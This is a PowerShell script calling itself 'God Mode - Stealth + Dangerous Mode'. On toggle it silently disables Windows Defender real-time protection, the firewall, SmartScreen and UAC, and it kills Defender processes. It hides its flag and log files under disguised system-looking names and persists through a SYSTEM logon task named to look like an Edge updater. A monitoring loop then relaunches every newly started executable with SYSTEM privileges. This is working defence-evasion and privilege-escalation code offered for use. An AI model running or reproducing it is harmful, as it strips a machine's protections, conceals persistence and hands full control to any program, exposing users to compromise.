#Requires -RunAsAdministrator

<#
.SYNOPSIS
    God Mode - Stealth + Dangerous Mode
#>

param(
    [switch]$ToggleOn,
    [switch]$ToggleOff,
    [switch]$Status,
    [switch]$Launch
)

$FlagFile = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
$LogFile  = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
$TaskName = "MicrosoftEdgeUpdateTask_" + (Get-Random -Minimum 10000 -Maximum 99999)

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $Time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "[$Time] [$Level] $Message" | Out-File $LogFile -Append -Encoding UTF8
}

function Apply-StealthDangerous {
    # Disable security features silently
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0 -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Force

        # Try to stop Defender processes
        Get-Process -Name MsMpEng, smartscreen -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    } catch {}
}

function Revert-StealthSettings {
    try {
        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 1 -Force
        Start-Service -Name WinDefend -ErrorAction SilentlyContinue
    } catch {}
}

function Set-Toggle {
    param([bool]$Enabled)
    if ($Enabled) {
        "1" | Out-File $FlagFile -Force
        Apply-StealthDangerous
        Start-StealthMonitor
    } else {
        Remove-Item $FlagFile -Force -ErrorAction SilentlyContinue
        Revert-StealthSettings
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    }
}

function Get-Status {
    if (Test-Path $FlagFile) {
        Write-Host "Status: ACTIVE (Stealth Dangerous Mode)" -ForegroundColor Red
    } else {
        Write-Host "Status: INACTIVE" -ForegroundColor Yellow
    }
}

function Start-StealthMonitor {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Launch"
    $Trigger = New-ScheduledTaskTrigger -AtLogon
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
}

function Elevate-Process {
    param([string]$Path)
    if (-not (Test-Path $Path)) { return }
    try {
        $Action = New-ScheduledTaskAction -Execute $Path
        $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $tempTask = "UpdateTask_" + (Get-Random -Minimum 1000 -Maximum 99999)
        Register-ScheduledTask -TaskName $tempTask -Action $Action -Principal $Principal -Force | Out-Null
        Start-ScheduledTask -TaskName $tempTask
        Start-Sleep -Milliseconds 300
        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false
    } catch {}
}

function Start-GodMode {
    if (-not (Test-Path $FlagFile)) { return }

    $seen = @{}
    while ($true) {
        Start-Sleep -Seconds 2
        $recent = Get-WmiObject Win32_Process | Where-Object {
            $_.CreationDate -and ([datetime]::ParseExact($_.CreationDate.Substring(0,14), "yyyyMMddHHmmss", $null)) -gt (Get-Date).AddSeconds(-8)
        }
        foreach ($p in $recent) {
            if ($p.ExecutablePath -like "*.exe" -and -not $seen.ContainsKey($p.ExecutablePath)) {
                $seen[$p.ExecutablePath] = $true
                Elevate-Process $p.ExecutablePath
            }
        }
    }
}

# === CLI (Minimal output) ===
if ($ToggleOn)  { Set-Toggle $true; exit }
if ($ToggleOff) { Set-Toggle $false; exit }
if ($Status)    { Get-Status; exit }

if ($Launch) {
    Start-GodMode
}